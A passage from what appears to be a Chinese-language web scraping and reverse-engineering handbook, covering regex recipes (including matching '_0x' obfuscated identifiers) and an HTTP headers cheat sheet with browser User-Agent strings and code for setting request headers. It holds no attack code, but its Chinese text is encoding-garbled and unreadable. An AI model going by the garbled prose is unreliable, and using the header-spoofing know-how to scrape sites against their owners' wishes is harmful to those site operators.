<span class="kd">const</span><span class="w"> </span><span class="nx">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/(?&lt;year&gt;\d{4})-(?&lt;month&gt;\d{2})-(?&lt;day&gt;\d{2})/</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;2024-01-15&#39;</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">pattern</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">match</span><span class="p">.</span><span class="nx">groups</span><span class="p">.</span><span class="nx">year</span><span class="p">);</span><span class="w">   </span><span class="c1">// &#39;2024&#39;</span>
</code></pre>
      </div>

      <h2 id="åœ¨çº¿æµ‹è¯•å·¥å…·">åœ¨çº¿æµ‹è¯•å·¥å…·</h2>

      <ul>
        <li><strong>Regex101</strong>: <a href="https://regex101.com/">https://regex101.com/</a> (æ¨èï¼Œæœ‰è¯¦ç»†è¯´æ˜)</li>
        <li><strong>RegExr</strong>: <a href="https://regexr.com/">https://regexr.com/</a></li>
        <li><strong>RegexPal</strong>: <a href="https://www.regexpal.com/">https://www.regexpal.com/</a></li>
      </ul>

      <h2 id="å®æˆ˜ç¤ºä¾‹é›†">å®æˆ˜ç¤ºä¾‹é›†</h2>

      <h3 id="1-æå–javascriptå‡½æ•°è°ƒç”¨">1. æå–JavaScriptå‡½æ•°è°ƒç”¨</h3>

      <pre><code>(\w+)\s*\(([^)]*)\)
</code></pre>

      <div class="codehilite">
        <pre><span></span><code><span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;encrypt(&#39;password&#39;, &#39;key&#39;); hash(data)&quot;</span>
<span class="n">calls</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;(\w+)\s*\(([^)]*)\)&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
<span class="c1"># [(&#39;encrypt&#39;, &quot;&#39;password&#39;, &#39;key&#39;&quot;), (&#39;hash&#39;, &#39;data&#39;)]</span>
</code></pre>
      </div>

      <h3 id="2-æ¸…ç†htmlæ ‡ç­¾">2. æ¸…ç†HTMLæ ‡ç­¾</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">html</span> <span class="o">=</span> <span class="s2">&quot;&lt;p&gt;Hello &lt;strong&gt;World&lt;/strong&gt;&lt;/p&gt;&quot;</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;[^&gt;]+&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span>
<span class="c1"># &quot;Hello World&quot;</span>
</code></pre>
      </div>

      <h3 id="3-éªŒè¯æ—¶é—´æˆ³æ ¼å¼">3. éªŒè¯æ—¶é—´æˆ³æ ¼å¼</h3>

      <pre><code># 13ä½æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰
\b1\d{12}\b

# 10ä½æ—¶é—´æˆ³ï¼ˆç§’ï¼‰
\b1\d{9}\b
</code></pre>

      <h3 id="4-æå–æ··æ·†å˜é‡å">4. æå–æ··æ·†å˜é‡å</h3>

      <pre><code># æå– _0x å¼€å¤´çš„å˜é‡
_0x[a-f0-9]+
</code></pre>

      <div class="codehilite">
        <pre><span></span><code><span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;var _0x1234 = function(_0xabcd) { return _0xabcd + _0x5678; }&quot;</span>
<span class="nb">vars</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;_0x[a-f0-9]+&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
<span class="c1"># [&#39;_0x1234&#39;, &#39;_0xabcd&#39;, &#39;_0xabcd&#39;, &#39;_0x5678&#39;]</span>
</code></pre>
      </div>

      <h2 id="æ€§èƒ½ä¼˜åŒ–">æ€§èƒ½ä¼˜åŒ–</h2>

      <h3 id="é¿å…å›æº¯">é¿å…å›æº¯</h3>

      <pre><code># æ…¢ï¼ˆå¤§é‡å›æº¯ï¼‰
(a+)*b

# å¿«ï¼ˆä½¿ç”¨åŸå­ç»„ï¼‰
(?&gt;a+)*b
</code></pre>

      <h3 id="ç¼–è¯‘æ­£åˆ™">ç¼–è¯‘æ­£åˆ™</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¦‚æœè¦å¤šæ¬¡ä½¿ç”¨ï¼Œå…ˆç¼–è¯‘</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;complex_pattern&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">text</span> <span class="ow">in</span> <span class="n">texts</span><span class="p">:</span>
    <span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>  <span class="c1"># æ›´å¿«</span>
</code></pre>
      </div>

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘</a></li>
      </ul>

    </div>

    <div class="section" id="08-Cheat-Sheets-http-headers">
      <h2>67. HTTP Headers</h2>
      <h1 id="http-å¤´é€ŸæŸ¥è¡¨">HTTP å¤´é€ŸæŸ¥è¡¨</h1>

      <h2 id="å¸¸è§è¯·æ±‚å¤´-request-headers">å¸¸è§è¯·æ±‚å¤´ (Request Headers)</h2>

      <table>
        <thead>
          <tr>
            <th>Header</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>User-Agent</strong></td>
            <td>å®¢æˆ·ç«¯ä¿¡æ¯</td>
            <td><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)...</code></td>
          </tr>
          <tr>
            <td><strong>Accept</strong></td>
            <td>å¯æ¥å—çš„å†…å®¹ç±»å‹</td>
            <td><code>application/json, text/plain, */*</code></td>
          </tr>
          <tr>
            <td><strong>Accept-Language</strong></td>
            <td>å¯æ¥å—çš„è¯­è¨€</td>
            <td><code>zh-CN,zh;q=0.9,en;q=0.8</code></td>
          </tr>
          <tr>
            <td><strong>Accept-Encoding</strong></td>
            <td>å¯æ¥å—çš„ç¼–ç </td>
            <td><code>gzip, deflate, br</code></td>
          </tr>
          <tr>
            <td><strong>Content-Type</strong></td>
            <td>è¯·æ±‚ä½“å†…å®¹ç±»å‹</td>
            <td><code>application/json; charset=UTF-8</code></td>
          </tr>
          <tr>
            <td><strong>Content-Length</strong></td>
            <td>è¯·æ±‚ä½“é•¿åº¦</td>
            <td><code>1234</code></td>
          </tr>
          <tr>
            <td><strong>Authorization</strong></td>
            <td>è®¤è¯ä¿¡æ¯</td>
            <td><code>Bearer eyJhbGciOiJIUzI1NiIs...</code></td>
          </tr>
          <tr>
            <td><strong>Cookie</strong></td>
            <td>Cookieæ•°æ®</td>
            <td><code>session_id=abc123; user=admin</code></td>
          </tr>
          <tr>
            <td><strong>Referer</strong></td>
            <td>æ¥æºé¡µé¢</td>
            <td><code>https://example.com/page1</code></td>
          </tr>
          <tr>
            <td><strong>Origin</strong></td>
            <td>è¯·æ±‚æ¥æº</td>
            <td><code>https://example.com</code></td>
          </tr>
          <tr>
            <td><strong>Host</strong></td>
            <td>ç›®æ ‡ä¸»æœº</td>
            <td><code>api.example.com</code></td>
          </tr>
          <tr>
            <td><strong>Connection</strong></td>
            <td>è¿æ¥æ–¹å¼</td>
            <td><code>keep-alive</code></td>
          </tr>
          <tr>
            <td><strong>Cache-Control</strong></td>
            <td>ç¼“å­˜æ§åˆ¶</td>
            <td><code>no-cache, no-store</code></td>
          </tr>
          <tr>
            <td><strong>Pragma</strong></td>
            <td>HTTP/1.0ç¼“å­˜æ§åˆ¶</td>
            <td><code>no-cache</code></td>
          </tr>
          <tr>
            <td><strong>If-Modified-Since</strong></td>
            <td>æ¡ä»¶è¯·æ±‚</td>
            <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
          </tr>
          <tr>
            <td><strong>If-None-Match</strong></td>
            <td>ETagæ¡ä»¶è¯·æ±‚</td>
            <td><code>"686897696a7c876b7e"</code></td>
          </tr>
          <tr>
            <td><strong>Range</strong></td>
            <td>èŒƒå›´è¯·æ±‚</td>
            <td><code>bytes=0-1024</code></td>
          </tr>
          <tr>
            <td><strong>X-Requested-With</strong></td>
            <td>æ ‡è¯†AJAXè¯·æ±‚</td>
            <td><code>XMLHttpRequest</code></td>
          </tr>
          <tr>
            <td><strong>X-CSRF-Token</strong></td>
            <td>CSRFä»¤ç‰Œ</td>
            <td><code>abc123def456</code></td>
          </tr>
        </tbody>
      </table>

      <h2 id="å¸¸è§å“åº”å¤´-response-headers">å¸¸è§å“åº”å¤´ (Response Headers)</h2>

      <table>
        <thead>
          <tr>
            <th>Header</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Content-Type</strong></td>
            <td>å“åº”å†…å®¹ç±»å‹</td>
            <td><code>application/json; charset=utf-8</code></td>
          </tr>
          <tr>
            <td><strong>Content-Length</strong></td>
            <td>å“åº”ä½“é•¿åº¦</td>
            <td><code>1234</code></td>
          </tr>
          <tr>
            <td><strong>Content-Encoding</strong></td>
            <td>å“åº”ç¼–ç </td>
            <td><code>gzip</code></td>
          </tr>
          <tr>
            <td><strong>Set-Cookie</strong></td>
            <td>è®¾ç½®Cookie</td>
            <td><code>session_id=abc123; Path=/; HttpOnly</code></td>
          </tr>
          <tr>
            <td><strong>Cache-Control</strong></td>
            <td>ç¼“å­˜ç­–ç•¥</td>
            <td><code>max-age=3600, must-revalidate</code></td>
          </tr>
          <tr>
            <td><strong>Expires</strong></td>
            <td>è¿‡æœŸæ—¶é—´</td>
            <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
          </tr>
          <tr>
            <td><strong>ETag</strong></td>
            <td>èµ„æºæ ‡è¯†</td>
            <td><code>"686897696a7c876b7e"</code></td>
          </tr>
          <tr>
            <td><strong>Last-Modified</strong></td>
            <td>æœ€åä¿®æ”¹æ—¶é—´</td>
            <td><code>Wed, 21 Oct 2025 07:28:00 GMT</code></td>
          </tr>
          <tr>
            <td><strong>Location</strong></td>
            <td>é‡å®šå‘åœ°å€</td>
            <td><code>https://example.com/new-page</code></td>
          </tr>
          <tr>
            <td><strong>Server</strong></td>
            <td>æœåŠ¡å™¨ä¿¡æ¯</td>
            <td><code>nginx/1.18.0</code></td>
          </tr>
          <tr>
            <td><strong>X-Powered-By</strong></td>
            <td>æŠ€æœ¯æ ˆ</td>
            <td><code>PHP/7.4.0</code></td>
          </tr>
          <tr>
            <td><strong>Access-Control-Allow-Origin</strong></td>
            <td>CORSå…è®¸æ¥æº</td>
            <td><code>*</code> æˆ– <code>https://example.com</code></td>
          </tr>
          <tr>
            <td><strong>Access-Control-Allow-Methods</strong></td>
            <td>CORSå…è®¸æ–¹æ³•</td>
            <td><code>GET, POST, PUT, DELETE</code></td>
          </tr>
          <tr>
            <td><strong>Access-Control-Allow-Headers</strong></td>
            <td>CORSå…è®¸å¤´</td>
            <td><code>Content-Type, Authorization</code></td>
          </tr>
          <tr>
            <td><strong>Access-Control-Max-Age</strong></td>
            <td>CORSé¢„æ£€ç¼“å­˜</td>
            <td><code>3600</code></td>
          </tr>
          <tr>
            <td><strong>Strict-Transport-Security</strong></td>
            <td>HSTS</td>
            <td><code>max-age=31536000; includeSubDomains</code></td>
          </tr>
          <tr>
            <td><strong>X-Frame-Options</strong></td>
            <td>é˜²ç‚¹å‡»åŠ«æŒ</td>
            <td><code>DENY</code></td>
          </tr>
          <tr>
            <td><strong>X-Content-Type-Options</strong></td>
            <td>é˜²MIMEå—…æ¢</td>
            <td><code>nosniff</code></td>
          </tr>
          <tr>
            <td><strong>X-XSS-Protection</strong></td>
            <td>XSSè¿‡æ»¤å™¨</td>
            <td><code>1; mode=block</code></td>
          </tr>
        </tbody>
      </table>

      <h2 id="å®‰å…¨ç›¸å…³å¤´">å®‰å…¨ç›¸å…³å¤´</h2>

      <h3 id="è¯·æ±‚å®‰å…¨å¤´">è¯·æ±‚å®‰å…¨å¤´</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># CSRF é˜²æŠ¤</span>
<span class="err">X-CSRF-Token: abc123def456</span>
<span class="err">X-XSRF-TOKEN: abc123def456</span>

<span class="err"># è‡ªå®šä¹‰ç­¾å</span>
<span class="err">X-Signature: md5_hash_value</span>
<span class="err">X-Sign: sha256_hash_value</span>
<span class="err">X-Timestamp: 1702887654321</span>

<span class="err"># APIå¯†é’¥</span>
<span class="err">X-API-Key: your_api_key_here</span>
<span class="err">API-Key: your_api_key_here</span>
</code></pre>
      </div>

      <h3 id="å“åº”å®‰å…¨å¤´">å“åº”å®‰å…¨å¤´</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># å†…å®¹å®‰å…¨ç­–ç•¥</span>
<span class="err">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;</span>

<span class="err"># XSS é˜²æŠ¤</span>
<span class="err">X-XSS-Protection: 1; mode=block</span>

<span class="err"># é˜²ç‚¹å‡»åŠ«æŒ</span>
<span class="err">X-Frame-Options: SAMEORIGIN</span>

<span class="err"># MIME ç±»å‹å—…æ¢é˜²æŠ¤</span>
<span class="err">X-Content-Type-Options: nosniff</span>

<span class="err"># Referer ç­–ç•¥</span>
<span class="err">Referrer-Policy: no-referrer-when-downgrade</span>

<span class="err"># æƒé™ç­–ç•¥</span>
<span class="err">Permissions-Policy: geolocation=(), camera=()</span>
</code></pre>
      </div>

      <h2 id="content-type-å¸¸è§å€¼">Content-Type å¸¸è§å€¼</h2>

      <h3 id="è¯·æ±‚å“åº”é€šç”¨">è¯·æ±‚/å“åº”é€šç”¨</h3>

      <table>
        <thead>
          <tr>
            <th>Content-Type</th>
            <th>è¯´æ˜</th>
            <th>ç”¨é€”</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>application/json</code></td>
            <td>JSONæ•°æ®</td>
            <td>APIè¯·æ±‚/å“åº”</td>
          </tr>
          <tr>
            <td><code>application/x-www-form-urlencoded</code></td>
            <td>è¡¨å•æ•°æ®</td>
            <td>ä¼ ç»Ÿè¡¨å•æäº¤</td>
          </tr>
          <tr>
            <td><code>multipart/form-data</code></td>
            <td>æ–‡ä»¶ä¸Šä¼ </td>
            <td>å«æ–‡ä»¶çš„è¡¨å•</td>
          </tr>
          <tr>
            <td><code>text/html</code></td>
            <td>HTMLæ–‡æ¡£</td>
            <td>ç½‘é¡µ</td>
          </tr>
          <tr>
            <td><code>text/plain</code></td>
            <td>çº¯æ–‡æœ¬</td>
            <td>æ–‡æœ¬æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>text/css</code></td>
            <td>CSSæ ·å¼</td>
            <td>æ ·å¼è¡¨</td>
          </tr>
          <tr>
            <td><code>text/javascript</code></td>
            <td>JavaScript</td>
            <td>JSæ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>application/javascript</code></td>
            <td>JavaScript</td>
            <td>JSæ–‡ä»¶ï¼ˆæ–°æ ‡å‡†ï¼‰</td>
          </tr>
          <tr>
            <td><code>application/xml</code></td>
            <td>XMLæ•°æ®</td>
            <td>XMLæ ¼å¼</td>
          </tr>
          <tr>
            <td><code>text/xml</code></td>
            <td>XMLæ–‡æœ¬</td>
            <td>XMLæ–‡æœ¬</td>
          </tr>
          <tr>
            <td><code>application/octet-stream</code></td>
            <td>äºŒè¿›åˆ¶æµ</td>
            <td>æ–‡ä»¶ä¸‹è½½</td>
          </tr>
          <tr>
            <td><code>image/jpeg</code></td>
            <td>JPEGå›¾ç‰‡</td>
            <td>å›¾ç‰‡</td>
          </tr>
          <tr>
            <td><code>image/png</code></td>
            <td>PNGå›¾ç‰‡</td>
            <td>å›¾ç‰‡</td>
          </tr>
          <tr>
            <td><code>image/gif</code></td>
            <td>GIFå›¾ç‰‡</td>
            <td>åŠ¨å›¾</td>
          </tr>
          <tr>
            <td><code>image/svg+xml</code></td>
            <td>SVGå›¾ç‰‡</td>
            <td>çŸ¢é‡å›¾</td>
          </tr>
          <tr>
            <td><code>video/mp4</code></td>
            <td>MP4è§†é¢‘</td>
            <td>è§†é¢‘</td>
          </tr>
          <tr>
            <td><code>audio/mpeg</code></td>
            <td>MP3éŸ³é¢‘</td>
            <td>éŸ³é¢‘</td>
          </tr>
        </tbody>
      </table>

      <h2 id="è‡ªå®šä¹‰å¤´ç¤ºä¾‹">è‡ªå®šä¹‰å¤´ç¤ºä¾‹</h2>

      <h3 id="å¸¸è§çš„è‡ªå®šä¹‰ä¸šåŠ¡å¤´">å¸¸è§çš„è‡ªå®šä¹‰ä¸šåŠ¡å¤´</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># ç‰ˆæœ¬æ§åˆ¶</span>
<span class="err">X-API-Version: 1.0</span>
<span class="err">X-Client-Version: 2.3.1</span>

<span class="err"># è®¾å¤‡ä¿¡æ¯</span>
<span class="err">X-Device-ID: 1234567890abcdef</span>
<span class="err">X-Device-Type: mobile</span>
<span class="err">X-Platform: ios</span>
<span class="err">X-OS-Version: 14.5</span>

<span class="err"># è¿½è¸ªå’Œè°ƒè¯•</span>
<span class="err">X-Request-ID: uuid-1234-5678</span>
<span class="err">X-Trace-ID: trace_abc123</span>
<span class="err">X-Debug: true</span>

<span class="err"># åœ°ç†ä½ç½®</span>
<span class="err">X-Geo-Country: CN</span>
<span class="err">X-Geo-City: Beijing</span>
<span class="err">X-Client-IP: 1.2.3.4</span>

<span class="err"># A/Bæµ‹è¯•</span>
<span class="err">X-Experiment: variant_b</span>
<span class="err">X-Feature-Flag: new_ui_enabled</span>
</code></pre>
      </div>

      <h2 id="user-agent-ç¤ºä¾‹">User-Agent ç¤ºä¾‹</h2>

      <h3 id="æ¡Œé¢æµè§ˆå™¨">æ¡Œé¢æµè§ˆå™¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># Chrome (Windows)</span>
<span class="err">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span>

<span class="err"># Firefox (Windows)</span>
<span class="err">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span>

<span class="err"># Edge (Windows)</span>
<span class="err">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span>

<span class="err"># Safari (macOS)</span>
<span class="err">Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15</span>
</code></pre>
      </div>

      <h3 id="ç§»åŠ¨æµè§ˆå™¨">ç§»åŠ¨æµè§ˆå™¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># iPhone Safari</span>
<span class="err">Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1</span>

<span class="err"># Android Chrome</span>
<span class="err">Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36</span>

<span class="err"># iPad Safari</span>
<span class="err">Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1</span>
</code></pre>
      </div>

      <h3 id="çˆ¬è™«å·¥å…·">çˆ¬è™«/å·¥å…·</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err"># Python Requests</span>
<span class="err">python-requests/2.31.0</span>

<span class="err"># Postman</span>
<span class="err">PostmanRuntime/7.36.0</span>

<span class="err"># cURL</span>
<span class="err">curl/7.68.0</span>
</code></pre>
      </div>

      <h2 id="authorization-æ–¹å¼">Authorization æ–¹å¼</h2>

      <h3 id="bearer-token">Bearer Token</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span>
</code></pre>
      </div>

      <h3 id="basic-auth">Basic Auth</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=</span>
<span class="err"># (username:password çš„ Base64ç¼–ç )</span>
</code></pre>
      </div>

      <h3 id="digest-auth">Digest Auth</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Authorization: Digest username=&quot;user&quot;, realm=&quot;example.com&quot;, nonce=&quot;abc123&quot;, uri=&quot;/api&quot;, response=&quot;def456&quot;</span>
</code></pre>
      </div>

      <h3 id="api-key">API Key</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Authorization: ApiKey your_api_key_here</span>
<span class="err"># æˆ–</span>
<span class="err">X-API-Key: your_api_key_here</span>
</code></pre>
      </div>

      <h2 id="cookie-å±æ€§">Cookie å±æ€§</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Set-Cookie: session_id=abc123; Domain=example.com; Path=/; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Max-Age=3600; Secure; HttpOnly; SameSite=Strict</span>
</code></pre>
      </div>

      <p><strong>å±æ€§è¯´æ˜</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>å±æ€§</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Domain</code></td>
            <td>Cookieçš„ä½œç”¨åŸŸ</td>
          </tr>
          <tr>
            <td><code>Path</code></td>
            <td>Cookieçš„ä½œç”¨è·¯å¾„</td>
          </tr>
          <tr>
            <td><code>Expires</code></td>
            <td>è¿‡æœŸæ—¶é—´ï¼ˆç»å¯¹æ—¶é—´ï¼‰</td>
          </tr>
          <tr>
            <td><code>Max-Age</code></td>
            <td>å­˜æ´»æ—¶é—´ï¼ˆç§’ï¼‰</td>
          </tr>
          <tr>
            <td><code>Secure</code></td>
            <td>ä»…HTTPSä¼ è¾“</td>
          </tr>
          <tr>
            <td><code>HttpOnly</code></td>
            <td>ç¦æ­¢JavaScriptè®¿é—®</td>
          </tr>
          <tr>
            <td><code>SameSite</code></td>
            <td>è·¨ç«™è¯·æ±‚ç­–ç•¥ (Strict/Lax/None)</td>
          </tr>
        </tbody>
      </table>

      <h2 id="cache-control-æŒ‡ä»¤">Cache-Control æŒ‡ä»¤</h2>

      <h3 id="è¯·æ±‚æŒ‡ä»¤">è¯·æ±‚æŒ‡ä»¤</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Cache-Control: no-cache          # ä¸ä½¿ç”¨ç¼“å­˜</span>
<span class="err">Cache-Control: no-store          # ä¸å­˜å‚¨ç¼“å­˜</span>
<span class="err">Cache-Control: max-age=0         # ç«‹å³è¿‡æœŸ</span>
<span class="err">Cache-Control: max-stale=3600    # å¯æ¥å—è¿‡æœŸçš„ç¼“å­˜</span>
<span class="err">Cache-Control: min-fresh=600     # å¿…é¡»æ–°é²œçš„ç¼“å­˜</span>
<span class="err">Cache-Control: only-if-cached    # åªä½¿ç”¨ç¼“å­˜</span>
</code></pre>
      </div>

      <h3 id="å“åº”æŒ‡ä»¤">å“åº”æŒ‡ä»¤</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Cache-Control: public                    # å¯è¢«ä»»ä½•ç¼“å­˜å­˜å‚¨</span>
<span class="err">Cache-Control: private                   # åªèƒ½è¢«æµè§ˆå™¨ç¼“å­˜</span>
<span class="err">Cache-Control: no-cache                  # éœ€è¦éªŒè¯</span>
<span class="err">Cache-Control: no-store                  # ä¸èƒ½ç¼“å­˜</span>
<span class="err">Cache-Control: max-age=3600              # ç¼“å­˜3600ç§’</span>
<span class="err">Cache-Control: s-maxage=3600             # å…±äº«ç¼“å­˜æ—¶é—´</span>
<span class="err">Cache-Control: must-revalidate           # è¿‡æœŸåå¿…é¡»éªŒè¯</span>
<span class="err">Cache-Control: proxy-revalidate          # ä»£ç†ç¼“å­˜éœ€éªŒè¯</span>
<span class="err">Cache-Control: immutable                 # ä¸ä¼šæ”¹å˜</span>
</code></pre>
      </div>

      <h2 id="python-è®¾ç½®-headers">Python è®¾ç½® Headers</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="s1">&#39;Bearer your_token_here&#39;</span><span class="p">,</span>
    <span class="s1">&#39;X-Requested-With&#39;</span><span class="p">:</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Origin&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com&#39;</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre>
      </div>

      <h2 id="javascript-è®¾ç½®-headers">JavaScript è®¾ç½® Headers</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Fetch API</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;Authorization&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Bearer your_token_here&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;X-Custom-Header&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;custom_value&#39;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;value&#39;</span><span class="p">})</span>
<span class="p">})</span>

<span class="c1">// XHR</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">xhr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Bearer your_token_here&#39;</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;value&#39;</span><span class="p">}));</span>
</code></pre>
      </div>

      <h2 id="curl-è®¾ç½®-headers">cURL è®¾ç½® Headers</h2>

      <div class="codehilite">
        <pre><span></span><code>curl<span class="w"> </span>https://api.example.com/data<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: Mozilla/5.0...&quot;</span><span class="w"> </span><span class="se">\</span>
